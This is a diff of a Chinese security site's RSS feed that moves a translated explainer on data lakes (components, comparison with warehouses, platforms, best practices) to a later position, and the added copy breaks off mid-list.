@@ -6,8 +6,8 @@
     <link>https://min168.top/</link>
     <description>网络安全知识库</description>
     <language>zh-CN</language>
-    <pubDate>Sun, 26 Jul 2026 07:57:10 GMT</pubDate>
-    <lastBuildDate>Sun, 26 Jul 2026 07:57:10 GMT</lastBuildDate>
+    <pubDate>Sun, 26 Jul 2026 08:06:07 GMT</pubDate>
+    <lastBuildDate>Sun, 26 Jul 2026 08:06:07 GMT</lastBuildDate>
     <generator>@vuepress/plugin-feed</generator>
     <docs>https://validator.w3.org/feed/docs/rss2.html</docs>
     <category>转载</category>
@@ -4933,124 +4933,6 @@ WDAC默认限制未签名/非微软认证的代码执行。但银狐利用如下
 ]]></content:encoded>
     </item>
     <item>
-      <title>数据湖：它们是什么？为什么您的组织需要一个？</title>
-      <link>https://min168.top/like/%E6%95%B0%E6%8D%AE%E6%B9%96%EF%BC%9A%E5%AE%83%E4%BB%AC%E6%98%AF%E4%BB%80%E4%B9%88%EF%BC%9F%E4%B8%BA%E4%BB%80%E4%B9%88%E6%82%A8%E7%9A%84%E7%BB%84%E7%BB%87%E9%9C%80%E8%A6%81%E4%B8%80%E4%B8%AA%EF%BC%9F.html</link>
-      <guid>https://min168.top/like/%E6%95%B0%E6%8D%AE%E6%B9%96%EF%BC%9A%E5%AE%83%E4%BB%AC%E6%98%AF%E4%BB%80%E4%B9%88%EF%BC%9F%E4%B8%BA%E4%BB%80%E4%B9%88%E6%82%A8%E7%9A%84%E7%BB%84%E7%BB%87%E9%9C%80%E8%A6%81%E4%B8%80%E4%B8%AA%EF%BC%9F.html</guid>
-      <source url="https://min168.top/rss.xml">数据湖：它们是什么？为什么您的组织需要一个？</source>
-      <description>如今企业产生的数据量令人震惊。 然而，缺乏有效策略，大部分信息未被充分利用，数据被孤岛化。 这时，数据湖应运而生——一种强大且灵活的现代数据管理解决方案，能够将原始信息转化为有价值的资产。 如果您的组织正在寻找更好的数据处理和分析方法，本指南非常适合您。我们将解析什么是数据湖，它是如何运作的，以及为何不同行业的企业正在采用它。 数据湖介绍 让我们先从数...</description>
-      <category>应急响应</category>
-      <pubDate>Fri, 05 Dec 2025 16:22:10 GMT</pubDate>
-      <content:encoded><![CDATA[<figure><figcaption></figcaption></figure>
-<p>如今企业产生的数据量令人震惊。</p>
-<p>然而，缺乏有效策略，大部分信息未被充分利用，数据被孤岛化。</p>
-<p>这时，数据湖应运而生——一种强大且灵活的现代数据管理解决方案，能够将原始信息转化为有价值的资产。</p>
-<p>如果您的组织正在寻找更好的数据处理和分析方法，本指南非常适合您。我们将解析什么是数据湖，它是如何运作的，以及为何不同行业的企业正在采用它。</p>
-<h2>数据湖介绍</h2>
-<p>让我们先从数据湖的基本背景说起。</p>
-<h3>什么是数据湖？</h3>
-<p>数据湖是一个集中式存储库，旨在存储大量<a href="https://www.splunk.com/en_us/blog/learn/data-structured-vs-unstructured-vs-semi-structured.html" target="_blank" rel="noopener noreferrer">结构化、半结构化和非结构化数据</a>。与传统系统如数据仓库不同，数据湖不需要在存储数据<em>前</em>预定义模式。</p>
-<p>这使得它成为处理各种原始数据的组织的理想解决方案。可以把数据湖想象成一个广阔的开阔水域，数据流从多个来源流入。这包括从<a href="https://www.splunk.com/en_us/blog/learn/database-monitoring.html" target="_blank" rel="noopener noreferrer">数据库</a>、物联网设备到社交媒体平台和应用日志的各种各样。</p>
-<figure><figcaption></figcaption></figure>
-<h3>数据湖的组成部分</h3>
-<p>数据湖通常由三个主要组成部分组成：</p>
-<ul>
-<li><strong>数据摄取层：</strong> 该组件收集并加载来自多个来源的数据到存储层。</li>
-<li><strong>存储层：</strong> 这里存储所有原始数据。</li>
-<li><strong>数据处理与分析层：</strong> 这里的数据会被转换、清洗，并为不同工具和应用的分析做准备。</li>
-</ul>
-<p>其他辅助组件可能包括<a href="https://www.splunk.com/en_us/blog/learn/metadata-management.html" target="_blank" rel="noopener noreferrer">元数据管理</a>工具、安全框架和治理策略。</p>
-<h3>数据湖与数据仓库和数据湖仓一体有何不同？</h3>
-<p>了解<a href="https://www.splunk.com/en_us/blog/learn/data-warehouse-vs-data-lake.html" target="_blank" rel="noopener noreferrer">数据湖和数据仓库之间的</a>区别至关重要，因为它们通常相互补充而不是替代。</p>
-<ul>
-<li><strong>数据湖以其</strong>原生形式存储原始数据，而不强加固定结构。它们具有高度可扩展性、成本效益，并支持机器学习等高级分析方法。</li>
-<li><strong>数据仓库</strong>是处理数据以适应定义架构的结构化环境。它们针对<a href="https://www.splunk.com/en_us/blog/learn/business-intelligence.html" target="_blank" rel="noopener noreferrer">商业智能 （BI）</a> 工具和事务查询进行了优化，提供高性能但灵活性有限。</li>
-</ul>
-<p>这意味着数据湖能够保存图像、视频和文本等非结构化数据，而数据仓库更适合数字和日期等结构化数据。</p>
-<p>还有<a href="https://www.splunk.com/en_us/blog/learn/data-lakehouses.html" target="_blank" rel="noopener noreferrer">数据湖仓一体，</a>这是一种现代混合架构，将数据湖的可扩展性和灵活性与数据仓库的结构化数据管理和性能相结合。它支持来自统一平台的高级分析和商业智能。</p>
-<figure><figcaption></figcaption></figure>
-<p><em>这些照片展示了基本原理：数据湖没有像自然湖那样被强加的结构，而数据仓库则是为特定用途组织数据。</em></p>
-<h2>实现数据湖的好处</h2>
-<p>采用数据湖为企业带来了几项主要优势：</p>
-<h3>无缝数据访问</h3>
-<p>数据湖支持将信息从经常孤立的来源收集到一个中心位置。这种可访问性使<a href="https://www.splunk.com/en_us/blog/learn/data-analyst-role.html" target="_blank" rel="noopener noreferrer">分析师</a>、<a href="https://www.splunk.com/en_us/blog/learn/data-scientist-role-responsibilities.html" target="_blank" rel="noopener noreferrer">数据科学家</a>和<a href="https://www.splunk.com/en_us/blog/learn/chief-data-officer-role-responsibilities.html" target="_blank" rel="noopener noreferrer">高管</a>能够从相同的信息中汲取信息，从而减少数据驱动决策中的摩擦。</p>
-<h3>所有数据类型的灵活性</h3>
-<p>与最适合处理结构化数据的数据<a href="https://www.splunk.com/en_us/blog/learn/data-warehouse-vs-data-lake.html" target="_blank" rel="noopener noreferrer">仓库</a>不同，数据湖可以容纳任何类型的数据：文本、图像、视频、流数据，应有尽有。组织可以进行创新，而不会被僵化的模式所束缚。</p>
-<h3>可扩展性促进增长</h3>
-<p>AWS S3 和 Azure Data Lake 等现代解决方案可以轻松扩展 PB 级数据，而不会显着增加成本。数据湖的弹性特性可确保您的存储随着业务的增长而发展。</p>
-<h3>启用高级分析</h3>
-<p>对于探索机器学习、<a href="https://www.splunk.com/en_us/blog/learn/big-data-analytics.html" target="_blank" rel="noopener noreferrer">大数据分析</a>或<a href="https://www.splunk.com/en_us/blog/learn/predictive-modeling.html" target="_blank" rel="noopener noreferrer">预测建模</a>的组织来说，数据湖是黄金标准。</p>
-<p>数据团队能够通过使用数据湖直接访问原始数据。这使他们能够执行传统 BI 系统中无法实现的先进技术。例如，<a href="https://www.splunk.com/en_us/form/aws-security-lake-brief.html" target="_blank" rel="noopener noreferrer">Amazon Security Lake 和 Splunk 为高级分析功能提供了一个集成的集中式数据湖</a>。</p>
-<h3>成本效益</h3>
-<p>数据湖的存储解决方案明显比高性能数据库或仓库更实惠。此外，随着对大量 ETL（提取、转换、加载）准备的需求减少，数据湖可以显着节省成本。</p>
-<h2>数据湖工具和平台</h2>
-<p>要正确实施数据湖，您需要一个现成的解决方案。存在多种数据湖解决方案，可满足各种用例和预算限制。</p>
-<p>一些流行的选项包括：</p>
-<ul>
-<li><a href="https://aws.amazon.com/big-data/datalakes-and-analytics/datalakes/" target="_blank" rel="noopener noreferrer">AWS S3</a>​ <strong>：</strong> Amazon 基于云的存储服务具有高度可扩展性、经济实惠且易于与其他 AWS 服务集成。</li>
-<li><a href="https://learn.microsoft.com/en-us/azure/storage/blobs/data-lake-storage-introduction" target="_blank" rel="noopener noreferrer">Azure Data Lake Store （ADLS）：</a>ADLS 基于 Azure Blob 存储构建，支持在云中存储 PB 级非结构化数据。</li>
-<li><a href="https://cloud.google.com/?hl=en" target="_blank" rel="noopener noreferrer">谷歌云平台</a>​ <strong>：</strong> Google 提供多种数据湖解决方案，包括 Google Cloud Storage 和 BigQuery，可根据不同的业务需求量身定制。</li>
-<li><a href="https://hadoop.apache.org/" target="_blank" rel="noopener noreferrer">Hadoop</a>​ <strong>：</strong> 支持大数据处理能力的开源框架。Hadoop 用于世界上一些最广泛的数据湖。</li>
-<li><a href="https://www.snowflake.com/en/" target="_blank" rel="noopener noreferrer">Snowflake</a>​ <strong>：</strong> 一个一体化数据平台，结合了传统数据仓库和数据湖的功能。</li>
-</ul>
-<h3>Splunk 是数据湖吗？</h3>
-<p>Splunk 不是传统的数据湖，但提供了一些类似的功能。它主要是一个分析和可观察性平台，用于收集、索引和分析机器生成的数据，如<a href="https://www.splunk.com/en_us/blog/learn/logs-vs-metrics.html" target="_blank" rel="noopener noreferrer">日志和指标</a>。</p>
-<p>虽然 <a href="https://www.splunk.com/en_us/products/platform.html" target="_blank" rel="noopener noreferrer">Splunk 数据平台</a>可以存储大量半结构化数据，但其优势在于实时搜索、警报和监控，尤其是在 IT 运营、安全和 DevOps 方面。</p>
-<p>Splunk 可以在特定场景中充<em>当</em>数据湖，<a href="https://docs.splunk.com/Documentation/SplunkCloud/9.3.2408/FederatedSearch/faaslDataLakeIndexes" target="_blank" rel="noopener noreferrer">例如 Amazon Security Lake</a> 或 Splunk Data Fabric Search，它可以集中和分析原始数据。但是，它并不是被设计成一个全面的、架构灵活的数据湖，供广泛的企业使用。</p>
-<p>*(*​<a href="https://www.splunk.com/en_us/products.html" target="_blank" rel="noopener noreferrer">探索用于数据管理、可观测性和网络安全的 Splunk 统一平台</a>​ <em>。</em></p>
-<iframe class="vidyard_iframe" title="Building a Better Lake: How to Utilize Federated Search for Amazon Security Lake" src="https://play.vidyard.com/6iFwuVE8AT2TCfNpNCRGyU.html?" width="640" height="360" frameborder="0">&amp;nbsp;</iframe>
-<h2>真实世界的数据湖用例</h2>
-<p>各行各业的许多组织都依靠数据湖来推动创新。这里有几个例子：</p>
-<p>​<strong>零售业的客户个性化</strong>：零售连锁店使用数据湖来集成购买历史记录、社交媒体活动和网站行为。这种统一的数据可以为个人客户提供高度定制的购物体验。</p>
-<p><strong>医疗保健数据集成：</strong>  医院和实验室将病历、影像数据和患者遥测数据存储在数据湖中。这可以简化研究、预测性诊断并改善患者护理。</p>
-<p>**物联网和智能设备分析：**​<a href="https://corsosystems.com/posts/how-to-use-data-lakes-in-manufacturing" target="_blank" rel="noopener noreferrer">制造公司利用数据湖</a>来分析来自连接设备的高速物联网数据，帮助他们预测维护需求、优化工作流程并最大限度地减少停机时间。</p>
-<p><strong>金融风险管理：</strong>  银行使用数据湖来模拟客户行为并预测信用违约或欺诈等风险。通过将结构化财务记录与非结构化网络活动相结合，银行可以改进其整体风险管理策略。</p>
-<p>*（相关阅读：*​<a href="https://www.splunk.com/en_us/blog/learn/fcrm-financial-crime-risk-management.html" target="_blank" rel="noopener noreferrer">金融犯罪风险管理</a>​ <em>）</em></p>
-<h2>构建和维护数据湖：最佳实践</h2>
-<p>为了最大限度地发挥数据湖的效用，必须遵循以下分步最佳实践：</p>
-<h3>1. 从明确的数据治理策略开始</h3>
-<p>如果没有适当的治理，您的数据湖就有可能成为“<a href="https://www.alation.com/blog/data-swamp-lake-lakehouse/" target="_blank" rel="noopener noreferrer">数据沼泽</a>”，信息杂乱无章且难以提取。您还应该在流程的早期建立数据组织、使用和访问规则。</p>
-<p>有效的数据治理<em>实际上</em>与组织无关，它对于满足 GDPR、HIPAA 或 <a href="https://www.splunk.com/en_us/blog/learn/soc-compliance.html" target="_blank" rel="noopener noreferrer">SOC 2</a> 等<a href="https://www.splunk.com/en_us/blog/learn/regulatory-compliance.html" target="_blank" rel="noopener noreferrer">法规遵从性标准</a>至关重要。确保适当的访问控制、审计跟踪和数据沿袭跟踪有助于企业避免法律陷阱并维护客户信任。</p>
-<h3>2. 优先考虑安全</h3>
-<p>通过实施强大的用户身份验证、加密和合规性监控来确保数据湖的安全性。<a href="https://aws.amazon.com/lake-formation/" target="_blank" rel="noopener noreferrer"> AWS Lake Formation</a> 等技术使组织能够无缝地完成这一过程。</p>
-<h3>3. 维护元数据以加快检索速度</h3>
-<p>包括元数据标记，以帮助用户有效地搜索、定位和检索数据。<a href="https://atlas.apache.org/#/" target="_blank" rel="noopener noreferrer"> Apache Atlas</a> 等工具可以帮助管理整个湖中的综合元数据。</p>
-<h3>4. 设计灵活的数据管道</h3>
-<p><a href="https://spark.apache.org/" target="_blank" rel="noopener noreferrer"> Apache Spark</a> 和<a href="https://aws.amazon.com/glue/" target="_blank" rel="noopener noreferrer"> AWS Glue</a> 等平台简化了提取、转换和加载数据的过程，而不会将您锁定在特定的架构要求中。这符合数据湖的流体存储理念。</p>
-<h3>5. 定期监控绩效</h3>
-<p>请务必密切关注用户查询、作业运行时和数据存储成本。尝试寻找瓶颈并优化作，以确保数据湖随着您的使用模式而发展。</p>
-<h3>6. 优化性能</h3>
-<p>主动优化数据湖可以显著提高性能并降低成本。</p>
-<ul>
-<li>按时间或类别对数据进行分区，通过缩小搜索范围来加快查询执行速度。</li>
-<li>使用 Parquet 或 ORC 等列式存储格式可提高读取效率并减少存储占用空间。</li>
-<li>实现查询加速层（例如，物化视图或缓存引擎）可以缩短重复查询的响应时间。</li>
-</ul>
-<p>这些实践共同确保你的数据湖高效存储数据，同时快速可靠地提供洞察。</p>
-<h3>7. 管理数据生命周期</h3>
-<p>随着数据湖的扩大，管理<a href="https://www.splunk.com/en_us/blog/learn/dlm-data-lifecycle-management.html" target="_blank" rel="noopener noreferrer">存储数据的生命周期</a>变得至关重要。并非所有数据都具有长期价值，因此实施策略——如归档、分层存储或自动删除陈旧数据集——有助于控制存储成本并优化性能。</p>
-<p>许多云服务提供商提供内置生命周期策略来自动化这一流程。</p>
-<figure><figcaption></figcaption></figure>
-<h2>管理数据湖的挑战（以及如何解决这些挑战）</h2>
-<p>虽然数据湖的优势引人注目，但也有一些挑战需要考虑：</p>
-<ul>
-<li><strong>数据质量差：</strong>  原始数据通常存在不一致、错误和重复。实施自动清理工具和数据验证管道，以确保高质量的输入。</li>
-<li><strong>压倒性的体积：</strong>  未经过滤的大量数据可能会让用户不知所措。实施高效的索引和元数据标记可以缓解这种情况。</li>
-<li><strong>用户访问复杂性：</strong>  新用户可能难以查询非结构化数据。为了克服这个问题，请投资用户友好的查询解决方案，例如 <a href="https://prestodb.io/" target="_blank" rel="noopener noreferrer">Presto</a> 或 <a href="https://www.integrate.io/blog/12-sql-on-hadoop-tools/" target="_blank" rel="noopener noreferrer">SQL-on-Hadoop 工具</a>。</li>
-</ul>
-<h2>数据湖的未来趋势</h2>
-<p>随着数据生态系统的发展，数据湖变得更加智能和统一。新兴趋势包括：</p>
-<ul>
-<li>用于自动标记和发现的 AI 驱动的数据编目</li>
-<li>将分析性能与灵活性融为一体的数据湖屋的兴起</li>
-<li>与实时流媒体平台更紧密地集成。</li>
-</ul>
-<p>组织也正在转向受监管的自助服务模式，允许更多团队在不大量 IT 参与的情况下访问和分析数据，同时保持控制和合规性。</p>
-<h2>利用数据湖的力量</h2>
-<p>精心设计的数据湖不仅仅是高级存储解决方案，还提供了统一组织数据的机会。</p>
-<p>要从不同和孤立的数据中引入新的业务洞察，请考虑立即为您的企业构建数据湖。</p>
-]]></content:encoded>
-    </item>
-    <item>
       <title>GitHub Codespaces</title>
       <link>https://min168.top/net/GitHub%20Codespaces.html</link>
       <guid>https://min168.top/net/GitHub%20Codespaces.html</guid>
@@ -5179,6 +5061,124 @@ WDAC默认限制未签名/非微软认证的代码执行。但银狐利用如下
 <span class="line"><span>git commit -m "更新"</span></span>
 <span class="line"><span>git push</span></span></code></pre>
 <div class="line-numbers" aria-hidden="true" style="counter-reset:line-number 0"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div>]]></content:encoded>
+    </item>
+    <item>
+      <title>数据湖：它们是什么？为什么您的组织需要一个？</title>
+      <link>https://min168.top/like/%E6%95%B0%E6%8D%AE%E6%B9%96%EF%BC%9A%E5%AE%83%E4%BB%AC%E6%98%AF%E4%BB%80%E4%B9%88%EF%BC%9F%E4%B8%BA%E4%BB%80%E4%B9%88%E6%82%A8%E7%9A%84%E7%BB%84%E7%BB%87%E9%9C%80%E8%A6%81%E4%B8%80%E4%B8%AA%EF%BC%9F.html</link>
+      <guid>https://min168.top/like/%E6%95%B0%E6%8D%AE%E6%B9%96%EF%BC%9A%E5%AE%83%E4%BB%AC%E6%98%AF%E4%BB%80%E4%B9%88%EF%BC%9F%E4%B8%BA%E4%BB%80%E4%B9%88%E6%82%A8%E7%9A%84%E7%BB%84%E7%BB%87%E9%9C%80%E8%A6%81%E4%B8%80%E4%B8%AA%EF%BC%9F.html</guid>
+      <source url="https://min168.top/rss.xml">数据湖：它们是什么？为什么您的组织需要一个？</source>
+      <description>如今企业产生的数据量令人震惊。 然而，缺乏有效策略，大部分信息未被充分利用，数据被孤岛化。 这时，数据湖应运而生——一种强大且灵活的现代数据管理解决方案，能够将原始信息转化为有价值的资产。 如果您的组织正在寻找更好的数据处理和分析方法，本指南非常适合您。我们将解析什么是数据湖，它是如何运作的，以及为何不同行业的企业正在采用它。 数据湖介绍 让我们先从数...</description>
+      <category>应急响应</category>
+      <pubDate>Fri, 05 Dec 2025 16:22:10 GMT</pubDate>
+      <content:encoded><![CDATA[<figure><figcaption></figcaption></figure>
+<p>如今企业产生的数据量令人震惊。</p>
+<p>然而，缺乏有效策略，大部分信息未被充分利用，数据被孤岛化。</p>
+<p>这时，数据湖应运而生——一种强大且灵活的现代数据管理解决方案，能够将原始信息转化为有价值的资产。</p>
+<p>如果您的组织正在寻找更好的数据处理和分析方法，本指南非常适合您。我们将解析什么是数据湖，它是如何运作的，以及为何不同行业的企业正在采用它。</p>
+<h2>数据湖介绍</h2>
+<p>让我们先从数据湖的基本背景说起。</p>
+<h3>什么是数据湖？</h3>
+<p>数据湖是一个集中式存储库，旨在存储大量<a href="https://www.splunk.com/en_us/blog/learn/data-structured-vs-unstructured-vs-semi-structured.html" target="_blank" rel="noopener noreferrer">结构化、半结构化和非结构化数据</a>。与传统系统如数据仓库不同，数据湖不需要在存储数据<em>前</em>预定义模式。</p>
+<p>这使得它成为处理各种原始数据的组织的理想解决方案。可以把数据湖想象成一个广阔的开阔水域，数据流从多个来源流入。这包括从<a href="https://www.splunk.com/en_us/blog/learn/database-monitoring.html" target="_blank" rel="noopener noreferrer">数据库</a>、物联网设备到社交媒体平台和应用日志的各种各样。</p>
+<figure><figcaption></figcaption></figure>
+<h3>数据湖的组成部分</h3>
+<p>数据湖通常由三个主要组成部分组成：</p>
+<ul>
+<li><strong>数据摄取层：</strong> 该组件收集并加载来自多个来源的数据到存储层。</li>
+<li><strong>存储层：</strong> 这里存储所有原始数据。</li>
+<li><strong>数据处理与分析层：</strong> 这里的数据会被转换、清洗，并为不同工具和应用的分析做准备。</li>
+</ul>
+<p>其他辅助组件可能包括<a href="https://www.splunk.com/en_us/blog/learn/metadata-management.html" target="_blank" rel="noopener noreferrer">元数据管理</a>工具、安全框架和治理策略。</p>
+<h3>数据湖与数据仓库和数据湖仓一体有何不同？</h3>
+<p>了解<a href="https://www.splunk.com/en_us/blog/learn/data-warehouse-vs-data-lake.html" target="_blank" rel="noopener noreferrer">数据湖和数据仓库之间的</a>区别至关重要，因为它们通常相互补充而不是替代。</p>
+<ul>
+<li><strong>数据湖以其</strong>原生形式存储原始数据，而不强加固定结构。它们具有高度可扩展性、成本效益，并支持机器学习等高级分析方法。</li>
+<li><strong>数据仓库</strong>是处理数据以适应定义架构的结构化环境。它们针对<a href="https://www.splunk.com/en_us/blog/learn/business-intelligence.html" target="_blank" rel="noopener noreferrer">商业智能 （BI）</a> 工具和事务查询进行了优化，提供高性能但灵活性有限。</li>
+</ul>
+<p>这意味着数据湖能够保存图像、视频和文本等非结构化数据，而数据仓库更适合数字和日期等结构化数据。</p>
+<p>还有<a href="https://www.splunk.com/en_us/blog/learn/data-lakehouses.html" target="_blank" rel="noopener noreferrer">数据湖仓一体，</a>这是一种现代混合架构，将数据湖的可扩展性和灵活性与数据仓库的结构化数据管理和性能相结合。它支持来自统一平台的高级分析和商业智能。</p>
+<figure><figcaption></figcaption></figure>
+<p><em>这些照片展示了基本原理：数据湖没有像自然湖那样被强加的结构，而数据仓库则是为特定用途组织数据。</em></p>
+<h2>实现数据湖的好处</h2>
+<p>采用数据湖为企业带来了几项主要优势：</p>
+<h3>无缝数据访问</h3>
+<p>数据湖支持将信息从经常孤立的来源收集到一个中心位置。这种可访问性使<a href="https://www.splunk.com/en_us/blog/learn/data-analyst-role.html" target="_blank" rel="noopener noreferrer">分析师</a>、<a href="https://www.splunk.com/en_us/blog/learn/data-scientist-role-responsibilities.html" target="_blank" rel="noopener noreferrer">数据科学家</a>和<a href="https://www.splunk.com/en_us/blog/learn/chief-data-officer-role-responsibilities.html" target="_blank" rel="noopener noreferrer">高管</a>能够从相同的信息中汲取信息，从而减少数据驱动决策中的摩擦。</p>
+<h3>所有数据类型的灵活性</h3>
+<p>与最适合处理结构化数据的数据<a href="https://www.splunk.com/en_us/blog/learn/data-warehouse-vs-data-lake.html" target="_blank" rel="noopener noreferrer">仓库</a>不同，数据湖可以容纳任何类型的数据：文本、图像、视频、流数据，应有尽有。组织可以进行创新，而不会被僵化的模式所束缚。</p>
+<h3>可扩展性促进增长</h3>
+<p>AWS S3 和 Azure Data Lake 等现代解决方案可以轻松扩展 PB 级数据，而不会显着增加成本。数据湖的弹性特性可确保您的存储随着业务的增长而发展。</p>
+<h3>启用高级分析</h3>
+<p>对于探索机器学习、<a href="https://www.splunk.com/en_us/blog/learn/big-data-analytics.html" target="_blank" rel="noopener noreferrer">大数据分析</a>或<a href="https://www.splunk.com/en_us/blog/learn/predictive-modeling.html" target="_blank" rel="noopener noreferrer">预测建模</a>的组织来说，数据湖是黄金标准。</p>
+<p>数据团队能够通过使用数据湖直接访问原始数据。这使他们能够执行传统 BI 系统中无法实现的先进技术。例如，<a href="https://www.splunk.com/en_us/form/aws-security-lake-brief.html" target="_blank" rel="noopener noreferrer">Amazon Security Lake 和 Splunk 为高级分析功能提供了一个集成的集中式数据湖</a>。</p>
+<h3>成本效益</h3>
+<p>数据湖的存储解决方案明显比高性能数据库或仓库更实惠。此外，随着对大量 ETL（提取、转换、加载）准备的需求减少，数据湖可以显着节省成本。</p>
+<h2>数据湖工具和平台</h2>
+<p>要正确实施数据湖，您需要一个现成的解决方案。存在多种数据湖解决方案，可满足各种用例和预算限制。</p>
+<p>一些流行的选项包括：</p>
+<ul>
+<li><a href="https://aws.amazon.com/big-data/datalakes-and-analytics/datalakes/" target="_blank" rel="noopener noreferrer">AWS S3</a>​ <strong>：</strong> Amazon 基于云的存储服务具有高度可扩展性、经济实惠且易于与其他 AWS 服务集成。</li>
+<li><a href="https://learn.microsoft.com/en-us/azure/storage/blobs/data-lake-storage-introduction" target="_blank" rel="noopener noreferrer">Azure Data Lake Store （ADLS）：</a>ADLS 基于 Azure Blob 存储构建，支持在云中存储 PB 级非结构化数据。</li>
+<li><a href="https://cloud.google.com/?hl=en" target="_blank" rel="noopener noreferrer">谷歌云平台</a>​ <strong>：</strong> Google 提供多种数据湖解决方案，包括 Google Cloud Storage 和 BigQuery，可根据不同的业务需求量身定制。</li>
+<li><a href="https://hadoop.apache.org/" target="_blank" rel="noopener noreferrer">Hadoop</a>​ <strong>：</strong> 支持大数据处理能力的开源框架。Hadoop 用于世界上一些最广泛的数据湖。</li>
+<li><a href="https://www.snowflake.com/en/" target="_blank" rel="noopener noreferrer">Snowflake</a>​ <strong>：</strong> 一个一体化数据平台，结合了传统数据仓库和数据湖的功能。</li>
+</ul>
+<h3>Splunk 是数据湖吗？</h3>
+<p>Splunk 不是传统的数据湖，但提供了一些类似的功能。它主要是一个分析和可观察性平台，用于收集、索引和分析机器生成的数据，如<a href="https://www.splunk.com/en_us/blog/learn/logs-vs-metrics.html" target="_blank" rel="noopener noreferrer">日志和指标</a>。</p>
+<p>虽然 <a href="https://www.splunk.com/en_us/products/platform.html" target="_blank" rel="noopener noreferrer">Splunk 数据平台</a>可以存储大量半结构化数据，但其优势在于实时搜索、警报和监控，尤其是在 IT 运营、安全和 DevOps 方面。</p>
+<p>Splunk 可以在特定场景中充<em>当</em>数据湖，<a href="https://docs.splunk.com/Documentation/SplunkCloud/9.3.2408/FederatedSearch/faaslDataLakeIndexes" target="_blank" rel="noopener noreferrer">例如 Amazon Security Lake</a> 或 Splunk Data Fabric Search，它可以集中和分析原始数据。但是，它并不是被设计成一个全面的、架构灵活的数据湖，供广泛的企业使用。</p>
+<p>*(*​<a href="https://www.splunk.com/en_us/products.html" target="_blank" rel="noopener noreferrer">探索用于数据管理、可观测性和网络安全的 Splunk 统一平台</a>​ <em>。</em></p>
+<iframe class="vidyard_iframe" title="Building a Better Lake: How to Utilize Federated Search for Amazon Security Lake" src="https://play.vidyard.com/6iFwuVE8AT2TCfNpNCRGyU.html?" width="640" height="360" frameborder="0">&amp;nbsp;</iframe>
+<h2>真实世界的数据湖用例</h2>
+<p>各行各业的许多组织都依靠数据湖来推动创新。这里有几个例子：</p>
+<p>​<strong>零售业的客户个性化</strong>：零售连锁店使用数据湖来集成购买历史记录、社交媒体活动和网站行为。这种统一的数据可以为个人客户提供高度定制的购物体验。</p>
+<p><strong>医疗保健数据集成：</strong>  医院和实验室将病历、影像数据和患者遥测数据存储在数据湖中。这可以简化研究、预测性诊断并改善患者护理。</p>
+<p>**物联网和智能设备分析：**​<a href="https://corsosystems.com/posts/how-to-use-data-lakes-in-manufacturing" target="_blank" rel="noopener noreferrer">制造公司利用数据湖</a>来分析来自连接设备的高速物联网数据，帮助他们预测维护需求、优化工作流程并最大限度地减少停机时间。</p>
+<p><strong>金融风险管理：</strong>  银行使用数据湖来模拟客户行为并预测信用违约或欺诈等风险。通过将结构化财务记录与非结构化网络活动相结合，银行可以改进其整体风险管理策略。</p>
+<p>*（相关阅读：*​<a href="https://www.splunk.com/en_us/blog/learn/fcrm-financial-crime-risk-management.html" target="_blank" rel="noopener noreferrer">金融犯罪风险管理</a>​ <em>）</em></p>
+<h2>构建和维护数据湖：最佳实践</h2>
+<p>为了最大限度地发挥数据湖的效用，必须遵循以下分步最佳实践：</p>
+<h3>1. 从明确的数据治理策略开始</h3>
+<p>如果没有适当的治理，您的数据湖就有可能成为“<a href="https://www.alation.com/blog/data-swamp-lake-lakehouse/" target="_blank" rel="noopener noreferrer">数据沼泽</a>”，信息杂乱无章且难以提取。您还应该在流程的早期建立数据组织、使用和访问规则。</p>
+<p>有效的数据治理<em>实际上</em>与组织无关，它对于满足 GDPR、HIPAA 或 <a href="https://www.splunk.com/en_us/blog/learn/soc-compliance.html" target="_blank" rel="noopener noreferrer">SOC 2</a> 等<a href="https://www.splunk.com/en_us/blog/learn/regulatory-compliance.html" target="_blank" rel="noopener noreferrer">法规遵从性标准</a>至关重要。确保适当的访问控制、审计跟踪和数据沿袭跟踪有助于企业避免法律陷阱并维护客户信任。</p>
+<h3>2. 优先考虑安全</h3>
+<p>通过实施强大的用户身份验证、加密和合规性监控来确保数据湖的安全性。<a href="https://aws.amazon.com/lake-formation/" target="_blank" rel="noopener noreferrer"> AWS Lake Formation</a> 等技术使组织能够无缝地完成这一过程。</p>
+<h3>3. 维护元数据以加快检索速度</h3>
+<p>包括元数据标记，以帮助用户有效地搜索、定位和检索数据。<a href="https://atlas.apache.org/#/" target="_blank" rel="noopener noreferrer"> Apache Atlas</a> 等工具可以帮助管理整个湖中的综合元数据。</p>
+<h3>4. 设计灵活的数据管道</h3>
+<p><a href="https://spark.apache.org/" target="_blank" rel="noopener noreferrer"> Apache Spark</a> 和<a href="https://aws.amazon.com/glue/" target="_blank" rel="noopener noreferrer"> AWS Glue</a> 等平台简化了提取、转换和加载数据的过程，而不会将您锁定在特定的架构要求中。这符合数据湖的流体存储理念。</p>
+<h3>5. 定期监控绩效</h3>
+<p>请务必密切关注用户查询、作业运行时和数据存储成本。尝试寻找瓶颈并优化作，以确保数据湖随着您的使用模式而发展。</p>
+<h3>6. 优化性能</h3>
+<p>主动优化数据湖可以显著提高性能并降低成本。</p>
+<ul>
+<li>按时间或类别对数据进行分区，通过缩小搜索范围来加快查询执行速度。</li>
+<li>使用 Parquet 或 ORC 等列式存储格式可提高读取效率并减少存储占用空间。</li>
+<li>实现查询加速层（例如，物化视图或缓存引擎）可以缩短重复查询的响应时间。</li>
+</ul>
+<p>这些实践共同确保你的数据湖高效存储数据，同时快速可靠地提供洞察。</p>
+<h3>7. 管理数据生命周期</h3>
+<p>随着数据湖的扩大，管理<a href="https://www.splunk.com/en_us/blog/learn/dlm-data-lifecycle-management.html" target="_blank" rel="noopener noreferrer">存储数据的生命周期</a>变得至关重要。并非所有数据都具有长期价值，因此实施策略——如归档、分层存储或自动删除陈旧数据集——有助于控制存储成本并优化性能。</p>
+<p>许多云服务提供商提供内置生命周期策略来自动化这一流程。</p>
+<figure><figcaption></figcaption></figure>
+<h2>管理数据湖的挑战（以及如何解决这些挑战）</h2>
+<p>虽然数据湖的优势引人注目，但也有一些挑战需要考虑：</p>
+<ul>
+<li><strong>数据质量差：</strong>  原始数据通常存在不一致、错误和重复。实施自动清理工具和数据验证管道，以确保高质量的输入。</li>
